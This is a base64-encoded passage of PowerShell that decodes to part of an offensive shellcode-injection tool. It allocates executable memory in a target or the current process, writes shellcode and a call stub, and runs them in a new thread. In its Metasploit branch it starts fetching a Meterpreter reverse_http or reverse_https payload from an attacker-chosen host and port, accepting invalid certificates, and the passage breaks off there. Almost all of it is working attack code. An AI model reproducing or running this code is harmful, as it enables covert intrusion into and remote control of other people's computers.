b2Nlc3NBY2Nlc3NGbGFncy5BbGwgKDB4MDAxRjBGRkYpCiAgICAgICAgCiAgICAgICAgaWYgKCEkaFByb2Nlc3MpCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIG9wZW4gYSBwcm9jZXNzIGhhbmRsZSBmb3IgUElEOiAkUHJvY2Vzc0lEIgogICAgICAgIH0KCiAgICAgICAgJElzV293NjQgPSAkZmFsc2UKCiAgICAgICAgaWYgKCQ2NGJpdENQVSkgIyBPbmx5IHBlcmZvcm0gdGhlc2VzIGNoZWNrcyBpZiBDUFUgaXMgNjQtYml0CiAgICAgICAgewogICAgICAgICAgICAjIERldGVybWluZSBpcyB0aGUgcHJvY2VzcyBzcGVjaWZpZWQgaXMgMzIgb3IgNjQgYml0CiAgICAgICAgICAgICRJc1dvdzY0UHJvY2Vzcy5JbnZva2UoJGhQcm9jZXNzLCBbUmVmXSAkSXNXb3c2NCkgfCBPdXQtTnVsbAogICAgICAgICAgICAKICAgICAgICAgICAgaWYgKCghJElzV293NjQpIC1hbmQgJFBvd2VyU2hlbGwzMmJpdCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgJ1VuYWJsZSB0byBpbmplY3QgNjQtYml0IHNoZWxsY29kZSBmcm9tIHdpdGhpbiAzMi1iaXQgUG93ZXJzaGVsbC4gVXNlIHRoZSA2NC1iaXQgdmVyc2lvbiBvZiBQb3dlcnNoZWxsIGlmIHlvdSB3YW50IHRoaXMgdG8gd29yay4nCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmICgkSXNXb3c2NCkgIyAzMi1iaXQgV293NjQgcHJvY2VzcwogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpZiAoJFNoZWxsY29kZTMyLkxlbmd0aCAtZXEgMCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBUaHJvdyAnTm8gc2hlbGxjb2RlIHdhcyBwbGFjZWQgaW4gdGhlICRTaGVsbGNvZGUzMiB2YXJpYWJsZSEnCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICRTaGVsbGNvZGUgPSAkU2hlbGxjb2RlMzIKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ0luamVjdGluZyBpbnRvIGEgV293NjQgcHJvY2Vzcy4nCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICdVc2luZyAzMi1iaXQgc2hlbGxjb2RlLicKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlICMgNjQtYml0IHByb2Nlc3MKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWYgKCRTaGVsbGNvZGU2NC5MZW5ndGggLWVxIDApCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgVGhyb3cgJ05vIHNoZWxsY29kZSB3YXMgcGxhY2VkIGluIHRoZSAkU2hlbGxjb2RlNjQgdmFyaWFibGUhJwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAkU2hlbGxjb2RlID0gJFNoZWxsY29kZTY0CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICdVc2luZyA2NC1iaXQgc2hlbGxjb2RlLicKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlICMgMzItYml0IENQVQogICAgICAgIHsKICAgICAgICAgICAgaWYgKCRTaGVsbGNvZGUzMi5MZW5ndGggLWVxIDApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93ICdObyBzaGVsbGNvZGUgd2FzIHBsYWNlZCBpbiB0aGUgJFNoZWxsY29kZTMyIHZhcmlhYmxlIScKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgJFNoZWxsY29kZSA9ICRTaGVsbGNvZGUzMgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICdVc2luZyAzMi1iaXQgc2hlbGxjb2RlLicKICAgICAgICB9CgogICAgICAgICMgUmVzZXJ2ZSBhbmQgY29tbWl0IGVub3VnaCBtZW1vcnkgaW4gcmVtb3RlIHByb2Nlc3MgdG8gaG9sZCB0aGUgc2hlbGxjb2RlCiAgICAgICAgJFJlbW90ZU1lbUFkZHIgPSAkVmlydHVhbEFsbG9jRXguSW52b2tlKCRoUHJvY2VzcywgW0ludFB0cl06Olplcm8sICRTaGVsbGNvZGUuTGVuZ3RoICsgMSwgMHgzMDAwLCAweDQwKSAjIChSZXNlcnZlfENvbW1pdCwgUldYKQogICAgICAgIAogICAgICAgIGlmICghJFJlbW90ZU1lbUFkZHIpCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIGFsbG9jYXRlIHNoZWxsY29kZSBtZW1vcnkgaW4gUElEOiAkUHJvY2Vzc0lEIgogICAgICAgIH0KICAgICAgICAKICAgICAgICBXcml0ZS1WZXJib3NlICJTaGVsbGNvZGUgbWVtb3J5IHJlc2VydmVkIGF0IDB4JCgkUmVtb3RlTWVtQWRkci5Ub1N0cmluZygiWCQoW0ludFB0cl06OlNpemUqMikiKSkiCgogICAgICAgICMgQ29weSBzaGVsbGNvZGUgaW50byB0aGUgcHJldmlvdXNseSBhbGxvY2F0ZWQgbWVtb3J5CiAgICAgICAgJFdyaXRlUHJvY2Vzc01lbW9yeS5JbnZva2UoJGhQcm9jZXNzLCAkUmVtb3RlTWVtQWRkciwgJFNoZWxsY29kZSwgJFNoZWxsY29kZS5MZW5ndGgsIFtSZWZdIDApIHwgT3V0LU51bGwKCiAgICAgICAgIyBHZXQgYWRkcmVzcyBvZiBFeGl0VGhyZWFkIGZ1bmN0aW9uCiAgICAgICAgJEV4aXRUaHJlYWRBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBFeGl0VGhyZWFkCgogICAgICAgIGlmICgkSXNXb3c2NCkKICAgICAgICB7CiAgICAgICAgICAgICMgQnVpbGQgMzItYml0IGlubGluZSBhc3NlbWJseSBzdHViIHRvIGNhbGwgdGhlIHNoZWxsY29kZSB1cG9uIGNyZWF0aW9uIG9mIGEgcmVtb3RlIHRocmVhZC4KICAgICAgICAgICAgJENhbGxTdHViID0gRW1pdC1DYWxsVGhyZWFkU3R1YiAkUmVtb3RlTWVtQWRkciAkRXhpdFRocmVhZEFkZHIgMzIKICAgICAgICAgICAgCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ0VtaXR0aW5nIDMyLWJpdCBhc3NlbWJseSBjYWxsIHN0dWIuJwogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICAjIEJ1aWxkIDY0LWJpdCBpbmxpbmUgYXNzZW1ibHkgc3R1YiB0byBjYWxsIHRoZSBzaGVsbGNvZGUgdXBvbiBjcmVhdGlvbiBvZiBhIHJlbW90ZSB0aHJlYWQuCiAgICAgICAgICAgICRDYWxsU3R1YiA9IEVtaXQtQ2FsbFRocmVhZFN0dWIgJFJlbW90ZU1lbUFkZHIgJEV4aXRUaHJlYWRBZGRyIDY0CiAgICAgICAgICAgIAogICAgICAgICAgICBXcml0ZS1WZXJib3NlICdFbWl0dGluZyA2NC1iaXQgYXNzZW1ibHkgY2FsbCBzdHViLicKICAgICAgICB9CgogICAgICAgICMgQWxsb2NhdGUgaW5saW5lIGFzc2VtYmx5IHN0dWIKICAgICAgICAkUmVtb3RlU3R1YkFkZHIgPSAkVmlydHVhbEFsbG9jRXguSW52b2tlKCRoUHJvY2VzcywgW0ludFB0cl06Olplcm8sICRDYWxsU3R1Yi5MZW5ndGgsIDB4MzAwMCwgMHg0MCkgIyAoUmVzZXJ2ZXxDb21taXQsIFJXWCkKICAgICAgICAKICAgICAgICBpZiAoISRSZW1vdGVTdHViQWRkcikKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gYWxsb2NhdGUgdGhyZWFkIGNhbGwgc3R1YiBtZW1vcnkgaW4gUElEOiAkUHJvY2Vzc0lEIgogICAgICAgIH0KICAgICAgICAKICAgICAgICBXcml0ZS1WZXJib3NlICJUaHJlYWQgY2FsbCBzdHViIG1lbW9yeSByZXNlcnZlZCBhdCAweCQoJFJlbW90ZVN0dWJBZGRyLlRvU3RyaW5nKCJYJChbSW50UHRyXTo6U2l6ZSoyKSIpKSIKCiAgICAgICAgIyBXcml0ZSAzMi1iaXQgYXNzZW1ibHkgc3R1YiB0byByZW1vdGUgcHJvY2VzcyBtZW1vcnkgc3BhY2UKICAgICAgICAkV3JpdGVQcm9jZXNzTWVtb3J5Lkludm9rZSgkaFByb2Nlc3MsICRSZW1vdGVTdHViQWRkciwgJENhbGxTdHViLCAkQ2FsbFN0dWIuTGVuZ3RoLCBbUmVmXSAwKSB8IE91dC1OdWxsCgogICAgICAgICMgRXhlY3V0ZSBzaGVsbGNvZGUgYXMgYSByZW1vdGUgdGhyZWFkCiAgICAgICAgJFRocmVhZEhhbmRsZSA9ICRDcmVhdGVSZW1vdGVUaHJlYWQuSW52b2tlKCRoUHJvY2VzcywgW0ludFB0cl06Olplcm8sIDAsICRSZW1vdGVTdHViQWRkciwgJFJlbW90ZU1lbUFkZHIsIDAsIFtJbnRQdHJdOjpaZXJvKQogICAgICAgIAogICAgICAgIGlmICghJFRocmVhZEhhbmRsZSkKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gbGF1bmNoIHJlbW90ZSB0aHJlYWQgaW4gUElEOiAkUHJvY2Vzc0lEIgogICAgICAgIH0KCiAgICAgICAgIyBDbG9zZSBwcm9jZXNzIGhhbmRsZQogICAgICAgICRDbG9zZUhhbmRsZS5JbnZva2UoJGhQcm9jZXNzKSB8IE91dC1OdWxsCgogICAgICAgIFdyaXRlLVZlcmJvc2UgJ1NoZWxsY29kZSBpbmplY3Rpb24gY29tcGxldGUhJwogICAgfQoKICAgIGZ1bmN0aW9uIExvY2FsOkluamVjdC1Mb2NhbFNoZWxsY29kZQogICAgewogICAgICAgIGlmICgkUG93ZXJTaGVsbDMyYml0KSB7CiAgICAgICAgICAgIGlmICgkU2hlbGxjb2RlMzIuTGVuZ3RoIC1lcSAwKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBUaHJvdyAnTm8gc2hlbGxjb2RlIHdhcyBwbGFjZWQgaW4gdGhlICRTaGVsbGNvZGUzMiB2YXJpYWJsZSEnCiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgJFNoZWxsY29kZSA9ICRTaGVsbGNvZGUzMgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICdVc2luZyAzMi1iaXQgc2hlbGxjb2RlLicKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgaWYgKCRTaGVsbGNvZGU2NC5MZW5ndGggLWVxIDApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93ICdObyBzaGVsbGNvZGUgd2FzIHBsYWNlZCBpbiB0aGUgJFNoZWxsY29kZTY0IHZhcmlhYmxlIScKICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICAkU2hlbGxjb2RlID0gJFNoZWxsY29kZTY0CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1VzaW5nIDY0LWJpdCBzaGVsbGNvZGUuJwogICAgICAgIH0KICAgIAogICAgICAgICMgQWxsb2NhdGUgUldYIG1lbW9yeSBmb3IgdGhlIHNoZWxsY29kZQogICAgICAgICRCYXNlQWRkcmVzcyA9ICRWaXJ0dWFsQWxsb2MuSW52b2tlKFtJbnRQdHJdOjpaZXJvLCAkU2hlbGxjb2RlLkxlbmd0aCArIDEsIDB4MzAwMCwgMHg0MCkgIyAoUmVzZXJ2ZXxDb21taXQsIFJXWCkKICAgICAgICBpZiAoISRCYXNlQWRkcmVzcykKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gYWxsb2NhdGUgc2hlbGxjb2RlIG1lbW9yeSBpbiBQSUQ6ICRQcm9jZXNzSUQiCiAgICAgICAgfQogICAgICAgIAogICAgICAgIFdyaXRlLVZlcmJvc2UgIlNoZWxsY29kZSBtZW1vcnkgcmVzZXJ2ZWQgYXQgMHgkKCRCYXNlQWRkcmVzcy5Ub1N0cmluZygiWCQoW0ludFB0cl06OlNpemUqMikiKSkiCgogICAgICAgICMgQ29weSBzaGVsbGNvZGUgdG8gUldYIGJ1ZmZlcgogICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkNvcHkoJFNoZWxsY29kZSwgMCwgJEJhc2VBZGRyZXNzLCAkU2hlbGxjb2RlLkxlbmd0aCkKICAgICAgICAKICAgICAgICAjIEdldCBhZGRyZXNzIG9mIEV4aXRUaHJlYWQgZnVuY3Rpb24KICAgICAgICAkRXhpdFRocmVhZEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIEV4aXRUaHJlYWQKICAgICAgICAKICAgICAgICBpZiAoJFBvd2VyU2hlbGwzMmJpdCkKICAgICAgICB7CiAgICAgICAgICAgICRDYWxsU3R1YiA9IEVtaXQtQ2FsbFRocmVhZFN0dWIgJEJhc2VBZGRyZXNzICRFeGl0VGhyZWFkQWRkciAzMgogICAgICAgICAgICAKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnRW1pdHRpbmcgMzItYml0IGFzc2VtYmx5IGNhbGwgc3R1Yi4nCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgICRDYWxsU3R1YiA9IEVtaXQtQ2FsbFRocmVhZFN0dWIgJEJhc2VBZGRyZXNzICRFeGl0VGhyZWFkQWRkciA2NAogICAgICAgICAgICAKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnRW1pdHRpbmcgNjQtYml0IGFzc2VtYmx5IGNhbGwgc3R1Yi4nCiAgICAgICAgfQoKICAgICAgICAjIEFsbG9jYXRlIFJXWCBtZW1vcnkgZm9yIHRoZSB0aHJlYWQgY2FsbCBzdHViCiAgICAgICAgJENhbGxTdHViQWRkcmVzcyA9ICRWaXJ0dWFsQWxsb2MuSW52b2tlKFtJbnRQdHJdOjpaZXJvLCAkQ2FsbFN0dWIuTGVuZ3RoICsgMSwgMHgzMDAwLCAweDQwKSAjIChSZXNlcnZlfENvbW1pdCwgUldYKQogICAgICAgIGlmICghJENhbGxTdHViQWRkcmVzcykKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gYWxsb2NhdGUgdGhyZWFkIGNhbGwgc3R1Yi4iCiAgICAgICAgfQogICAgICAgIAogICAgICAgIFdyaXRlLVZlcmJvc2UgIlRocmVhZCBjYWxsIHN0dWIgbWVtb3J5IHJlc2VydmVkIGF0IDB4JCgkQ2FsbFN0dWJBZGRyZXNzLlRvU3RyaW5nKCJYJChbSW50UHRyXTo6U2l6ZSoyKSIpKSIKCiAgICAgICAgIyBDb3B5IGNhbGwgc3R1YiB0byBSV1ggYnVmZmVyCiAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkQ2FsbFN0dWIsIDAsICRDYWxsU3R1YkFkZHJlc3MsICRDYWxsU3R1Yi5MZW5ndGgpCgogICAgICAgICMgTGF1bmNoIHNoZWxsY29kZSBpbiBpdCdzIG93biB0aHJlYWQKICAgICAgICAkVGhyZWFkSGFuZGxlID0gJENyZWF0ZVRocmVhZC5JbnZva2UoW0ludFB0cl06Olplcm8sIDAsICRDYWxsU3R1YkFkZHJlc3MsICRCYXNlQWRkcmVzcywgMCwgW0ludFB0cl06Olplcm8pCiAgICAgICAgaWYgKCEkVGhyZWFkSGFuZGxlKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBsYXVuY2ggdGhyZWFkLiIKICAgICAgICB9CgogICAgICAgICMgV2FpdCBmb3Igc2hlbGxjb2RlIHRocmVhZCB0byB0ZXJtaW5hdGUKICAgICAgICAkV2FpdEZvclNpbmdsZU9iamVjdC5JbnZva2UoJFRocmVhZEhhbmRsZSwgMHhGRkZGRkZGRikgfCBPdXQtTnVsbAogICAgICAgIAogICAgICAgICRWaXJ0dWFsRnJlZS5JbnZva2UoJENhbGxTdHViQWRkcmVzcywgJENhbGxTdHViLkxlbmd0aCArIDEsIDB4ODAwMCkgfCBPdXQtTnVsbCAjIE1FTV9SRUxFQVNFICgweDgwMDApCiAgICAgICAgJFZpcnR1YWxGcmVlLkludm9rZSgkQmFzZUFkZHJlc3MsICRTaGVsbGNvZGUuTGVuZ3RoICsgMSwgMHg4MDAwKSB8IE91dC1OdWxsICMgTUVNX1JFTEVBU0UgKDB4ODAwMCkKCiAgICAgICAgV3JpdGUtVmVyYm9zZSAnU2hlbGxjb2RlIGluamVjdGlvbiBjb21wbGV0ZSEnCiAgICB9CgogICAgIyBBIHZhbGlkIHBvaW50ZXIgdG8gSXNXb3c2NFByb2Nlc3Mgd2lsbCBiZSByZXR1cm5lZCBpZiBDUFUgaXMgNjQtYml0CiAgICAkSXNXb3c2NFByb2Nlc3NBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBJc1dvdzY0UHJvY2VzcwogICAgaWYgKCRJc1dvdzY0UHJvY2Vzc0FkZHIpCiAgICB7CiAgICAJJElzV293NjRQcm9jZXNzRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtCb29sXS5NYWtlQnlSZWZUeXBlKCkpIChbQm9vbF0pCiAgICAJJElzV293NjRQcm9jZXNzID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJElzV293NjRQcm9jZXNzQWRkciwgJElzV293NjRQcm9jZXNzRGVsZWdhdGUpCiAgICAgICAgCiAgICAgICAgJDY0Yml0Q1BVID0gJHRydWUKICAgIH0KICAgIGVsc2UKICAgIHsKICAgIAkkNjRiaXRDUFUgPSAkZmFsc2UKICAgIH0KCiAgICBpZiAoW0ludFB0cl06OlNpemUgLWVxIDQpCiAgICB7CiAgICAgICAgJFBvd2VyU2hlbGwzMmJpdCA9ICR0cnVlCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgJFBvd2VyU2hlbGwzMmJpdCA9ICRmYWxzZQogICAgfQoKICAgIGlmICgkUHNDbWRsZXQuUGFyYW1ldGVyU2V0TmFtZSAtZXEgJ01ldGFzcGxvaXQnKQogICAgewogICAgICAgIGlmICghJFBvd2VyU2hlbGwzMmJpdCkgewogICAgICAgICAgICAjIFRoZSBjdXJyZW50bHkgc3VwcG9ydGVkIE1ldGFzcGxvaXQgcGF5bG9hZHMgYXJlIDMyLWJpdC4gVGhpcyBibG9jayBvZiBjb2RlIGltcGxlbWVudHMgdGhlIGxvZ2ljIHRvIGV4ZWN1dGUgdGhpcyBzY3JpcHQgZnJvbSAzMi1iaXQgUG93ZXJTaGVsbAogICAgICAgICAgICAjIEdldCB0aGlzIHNjcmlwdCdzIGNvbnRlbnRzIGFuZCBwYXNzIGl0IHRvIDMyLWJpdCBwb3dlcnNoZWxsIHdpdGggdGhlIHNhbWUgcGFyYW1ldGVycyBwYXNzZWQgdG8gdGhpcyBmdW5jdGlvbgoKICAgICAgICAgICAgIyBQdWxsIG91dCBqdXN0IHRoZSBjb250ZW50IG9mIHRoZSB0aGlzIHNjcmlwdCdzIGludm9jYXRpb24uCiAgICAgICAgICAgICRSb290SW52b2NhdGlvbiA9ICRNeUludm9jYXRpb24uTGluZQoKICAgICAgICAgICAgJFJlc3BvbnNlID0gJFRydWUKICAgICAgICAKICAgICAgICAgICAgaWYgKCAkRm9yY2UgLW9yICggJFJlc3BvbnNlID0gJHBzQ21kbGV0LlNob3VsZENvbnRpbnVlKCAiRG8geW91IHdhbnQgdG8gbGF1bmNoIHRoZSBwYXlsb2FkIGZyb20geDg2IFBvd2Vyc2hlbGw/IiwKICAgICAgICAgICAgICAgICAgICJBdHRlbXB0IHRvIGV4ZWN1dGUgMzItYml0IHNoZWxsY29kZSBmcm9tIDY0LWJpdCBQb3dlcnNoZWxsLiBOb3RlOiBUaGlzIHByb2Nlc3MgdGFrZXMgYWJvdXQgb25lIG1pbnV0ZS4gQmUgcGF0aWVudCEgWW91IHdpbGwgYWxzbyBzZWUgc29tZSBhcnRpZmFjdHMgb2YgdGhlIHNjcmlwdCBsb2FkaW5nIGluIHRoZSBvdGhlciBwcm9jZXNzLiIgKSApICkgeyB9CiAgICAgICAgCiAgICAgICAgICAgIGlmICggISRSZXNwb25zZSApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICMgVXNlciBvcHRlZCBub3QgdG8gbGF1bmNoIHRoZSAzMi1iaXQgcGF5bG9hZCBmcm9tIDMyLWJpdCBQb3dlclNoZWxsLiBFeGl0IGZ1bmN0aW9uCiAgICAgICAgICAgICAgICBSZXR1cm4KICAgICAgICAgICAgfQoKICAgICAgICAgICAgIyBTaW5jZSB0aGUgc2hlbGxjb2RlIHdpbGwgcnVuIGluIGEgbm9uaW50ZXJhY3RpdmUgaW5zdGFuY2Ugb2YgUG93ZXJTaGVsbCwgbWFrZSBzdXJlIHRoZSAtRm9yY2Ugc3dpdGNoIGlzIGluY2x1ZGVkIHNvIHRoYXQgdGhlcmUgaXMgbm8gd2FybmluZyBwcm9tcHQuCiAgICAgICAgICAgIGlmICgkTXlJbnZvY2F0aW9uLkJvdW5kUGFyYW1ldGVyc1snRm9yY2UnXSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiRXhlY3V0aW5nIHRoZSBmb2xsb3dpbmcgZnJvbSAzMi1iaXQgUG93ZXJTaGVsbDogJFJvb3RJbnZvY2F0aW9uIgogICAgICAgICAgICAgICAgJENvbW1hbmQgPSAiZnVuY3Rpb24gJCgkTXlJbnZvY2F0aW9uLkludm9jYXRpb25OYW1lKSB7YG4iICsgJE15SW52b2NhdGlvbi5NeUNvbW1hbmQuU2NyaXB0QmxvY2sgKyAiYG59YG4kKCRSb290SW52b2NhdGlvbilgbmBuIgogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiRXhlY3V0aW5nIHRoZSBmb2xsb3dpbmcgZnJvbSAzMi1iaXQgUG93ZXJTaGVsbDogJFJvb3RJbnZvY2F0aW9uIC1Gb3JjZSIKICAgICAgICAgICAgICAgICRDb21tYW5kID0gImZ1bmN0aW9uICQoJE15SW52b2NhdGlvbi5JbnZvY2F0aW9uTmFtZSkge2BuIiArICRNeUludm9jYXRpb24uTXlDb21tYW5kLlNjcmlwdEJsb2NrICsgImBufWBuJCgkUm9vdEludm9jYXRpb24pIC1Gb3JjZWBuYG4iCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICRDb21tYW5kQnl0ZXMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpBc2NpaS5HZXRCeXRlcygkQ29tbWFuZCkKICAgICAgICAgICAgJEVuY29kZWRDb21tYW5kID0gW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkQ29tbWFuZEJ5dGVzKQoKICAgICAgICAgICAgJEV4ZWN1dGUgPSAnJENvbW1hbmQnICsgIiB8ICRFbnY6d2luZGlyXFN5c1dPVzY0XFdpbmRvd3NQb3dlclNoZWxsXHYxLjBccG93ZXJzaGVsbC5leGUgLU5vUHJvZmlsZSAtQ29tbWFuZCAtIgogICAgICAgICAgICBJbnZva2UtRXhwcmVzc2lvbiAtQ29tbWFuZCAkRXhlY3V0ZSB8IE91dC1OdWxsCgogICAgICAgICAgICAjIEV4aXQgdGhlIHNjcmlwdCBzaW5jZSB0aGUgc2hlbGxjb2RlIHdpbGwgYmUgcnVubmluZyBmcm9tIHg4NiBQb3dlclNoZWxsCiAgICAgICAgICAgIFJldHVybgogICAgICAgIH0KICAgICAgICAKICAgICAgICAkUmVzcG9uc2UgPSAkVHJ1ZQogICAgICAgIAogICAgICAgIGlmICggJEZvcmNlIC1vciAoICRSZXNwb25zZSA9ICRwc0NtZGxldC5TaG91bGRDb250aW51ZSggIkRvIHlvdSBrbm93IHdoYXQgeW91J3JlIGRvaW5nPyIsCiAgICAgICAgICAgICAgICJBYm91dCB0byBkb3dubG9hZCBNZXRhc3Bsb2l0IHBheWxvYWQgJyQoJFBheWxvYWQpJyBMSE9TVD0kKCRMaG9zdCksIExQT1JUPSQoJExwb3J0KSIgKSApICkgeyB9CiAgICAgICAgCiAgICAgICAgaWYgKCAhJFJlc3BvbnNlICkKICAgICAgICB7CiAgICAgICAgICAgICMgVXNlciBvcHRlZCBub3QgdG8gY2Fycnkgb3V0IGRvd25sb2FkIG9mIE1ldGFzcGxvaXQgcGF5bG9hZC4gRXhpdCBmdW5jdGlvbgogICAgICAgICAgICBSZXR1cm4KICAgICAgICB9CiAgICAgICAgCiAgICAgICAgc3dpdGNoICgkUGF5bG9hZCkKICAgICAgICB7CiAgICAgICAgICAgICd3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cCcKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFNTTCA9ICcnCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgICd3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cHMnCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRTU0wgPSAncycKICAgICAgICAgICAgICAgICMgQWNjZXB0IGludmFsaWQgY2VydGlmaWNhdGVzCiAgICAgICAgICAgICAgICBbU3lzdGVtLk5ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sgPSB7JFRydWV9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgCiAgICAgICAgaWYgKCRMZWdhY3kpIAogICAgICAgIHsKICAgICAgICAgICAgIyBPbGQgTWV0ZXJwcmV0ZXIgaGFuZGxlciBleHBlY3RzICdJTklUTScgaW4gdGhlIFVSSSBpbiBvcmRlciB0byBpbml0aWF0ZSBzdGFnZSAwCiAgICAgICAgICAgICRSZXF1ZXN0ID0gImh0dHAkKCRTU0wpOi8vJCgkTGhvc3QpOiQoJExwb3J0KS9JTklUTSIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiUmVxdWVzdGluZyBtZXRlcnByZXRlciBwYXlsb2FkIGZyb20gJFJlcXVlc3QiCiAgICAgICAgfSBlbHNlIHsKCiAgICAgICAgICAgICMgR2VuZXJhdGUgYSBVUkkgdGhhdCBwYXNzZXMgdGhlIHRlc3QKICAgICAgICAgICAgJENoYXJBcnJheSA9IDQ4Li41NyArIDY1Li45MCArIDk3Li4xMjIgfCBGb3JFYWNoLU9iamVjdCB7W0NoYXJdJF99CiAgICAgICAgICAgICRTdW1UZXN0ID0gJEZhbHNlCgogICAgICAgICAgICB3aGlsZSAoJFN1bVRlc3QgLWVxICRGYWxzZSkgCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRHZW5lcmF0ZWRVcmkgPSAkQ2hhckFycmF5IHwgR2V0LVJhbmRvbSAtQ291bnQgNAogICAgICAgICAgICAgICAgJFN1bVRlc3QgPSAoKFtpbnRbXV0gJEdlbmVyYXRlZFVyaSB8IE1lYXN1cmUtT2JqZWN0IC1TdW0pLlN1bSAlIDB4MTAwIC1lcSA5MikKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJFJlcXVlc3RVcmkgPSAtam9pbiAkR2VuZXJhdGVkVXJpCgogICAgICAgICAgICAkUmVxdWVzdCA9ICJodHRwJCgkU1NMKTovLyQoJExob3N0KTokKCRMcG9ydCkvJCgkUmVxdWVzdFVyaSkiIAogICAgICAgIH0KICAgICAgICAgICAKICAgICAgICAkVXJpID0gTmV3LU9iamVjdCBVcmkoJFJlcXVlc3QpCiAgICAgICAgJFdlYkNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQKICAgICAgICAkV2ViQ2xpZW50LkhlYWRlcnMuQWRkKCd1c2VyLWFnZW50JywgIiRVc2VyQWdlbnQiKQogICAgICAgIAogICAgICAgIGlmICgkUHJveHkpCiAgICAgICAgewogICAgICAgICAgICAkV2ViUHJveHlPYmplY3QgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViUHJveHkKICAgICAgICAgICAgJFByb3h5QWRkcmVzcyA9IChHZXQtSXRlbVByb3BlcnR5IC1QYXRoICdIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxJbnRlcm5ldCBTZXR0aW5ncycpLlByb3h5U2VydmVyCiAgICAgICAgICAgIAogICAgICAgICAgICAjIGlmIHRoZXJlIGlzIG5vIHByb3h5IHNldCwgdGhlbiBjb250aW51ZSB3aXRob3V0IGl0CiAgICAgICAgICAgIGlmICgkUHJveHlBZGRyZXNzKSAKICAgICAgICAgICAgewogICAgICAgICAgICAKICAgICAgICAgICAgICAgICRXZWJQcm94eU9iamVjdC5BZGRyZXNzID0gJFByb3h5QWRkcmVzcwogICAgICAgICAgICAgICAgJFdlYlByb3h5T2JqZWN0LlVzZURlZmF1bHRDcmVkZW50aWFscyA9ICRUcnVlCiAgICAgICAgICAgICAgICAkV2ViQ2xpZW50T2J